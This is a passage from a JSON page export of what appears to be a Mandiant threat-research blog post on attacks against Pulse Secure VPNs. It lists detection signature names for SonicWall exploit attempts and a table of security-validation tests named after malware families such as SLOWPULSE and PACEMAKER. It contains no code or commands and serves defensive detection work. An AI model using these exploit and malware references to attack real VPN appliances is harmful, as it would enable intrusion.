Attempt]\u0026nbsp;\u003Cbr\u003E\nEXPLOIT - SONICWALL ES [CVE-2021-20021 Success]\u003Cbr\u003E\nEXPLOIT - SONICWALL ES [CVE-2021-20023 Attempt]\u003Cbr\u003E\nEXPLOIT - SONICWALL ES [CVE-2021-20023 Success]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EMandiant Security Validation Actions\u003C\/h4\u003E\n\u003Cp\u003EOrganizations can validate their security controls using the following actions with \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/mandiant\/security-validation.html\u0022 title=\u0022https:\/\/www.fireeye.com\/mandiant\/security-validation.html\u0022 adhocenable=\u0022false\u0022\u003EMandiant Security Validation\u003C\/a\u003E.\u003C\/p\u003E\n\u003Ctable border=\u00220\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022611\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003E\u003Cb\u003EVID\u003C\/b\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003E\u003Cb\u003ETitle\u003C\/b\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-596\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLOWPULSE, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-597\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLOWPULSE, Download, Variant #2\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-598\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLOWPULSE, Download, Variant #3\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-599\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLOWPULSE, Download, Variant #4\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-600\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLOWPULSE, Download, Variant #5\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-601\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLOWPULSE, Download, Variant #6\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-602\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLOWPULSE, Download, Variant #7\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-604\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - Pulse Secure Vulnerability, Utility, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-605\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - RADIALPULSE, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-606\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - PULSEJUMP, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-607\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - HARDPULSE, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-608\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - SLIGHTPULSE, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-609\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - LOCKPICK, Patcher, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-610\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - LOCKPICK, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-611\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - ATRIUM, Patcher, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-612\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - PACEMAKER, Launcher, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-613\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - PACEMAKER, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-614\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - QUIETPULSE Utility, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-615\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - QUIETPULSE, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-616\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - STEADYPULSE, Download, Variant #2\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-617\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - STEADYPULSE, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-618\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - ATRIUM, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-619\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - THINBLOOD, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-620\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - THINBLOOD, Download, Variant #2\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-621\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - PULSECHECK, Download, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA101-622\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EMalicious File Transfer - PULSECHECK, Download, Variant #2\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA104-757\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EHost CLI - QUIETPULSE Utility, Check, Variant #1\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA104-758\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EHost CLI - QUIETPULSE Utility, Check, Variant #2\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA104-759\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EHost CLI - QUIETPULSE Utility, Check, Variant #3\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u002287\u0022\u003E\u003Cp\u003EA104-760\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022525\u0022\u003E\u003Cp\u003EHost CLI - QUIETPULSE Utility, Check, Variant #4\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EMandiant would like to thank the Stroz Friedberg DFIR and Security Testing teams for their collaboration with the analysis and research. The team would also like to thank Joshua Villanueva, Regina Elwell, Jonathan Lepore, Dimiter Andonov, Josh Triplett, Jacob Thompson and\u0026nbsp;Michael Dockry for their hard work in analysis and blog content.\u003C\/p\u003E\n",
        "jcr:lastModified": "Mon May 10 2021 16:34:49 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Tue Apr 20 2021 02:05:38 GMT+0000",
      "imageRotate": "0"
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EThis post examines new persistence and auth bypass techniques for Pulse Secure VPNs, which we\u0027ve observed being used by one or more groups.\u003C\/p\u003E\n",
      "jcr:lastModified": "Tue Apr 20 2021 02:05:06 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    }
  }
}
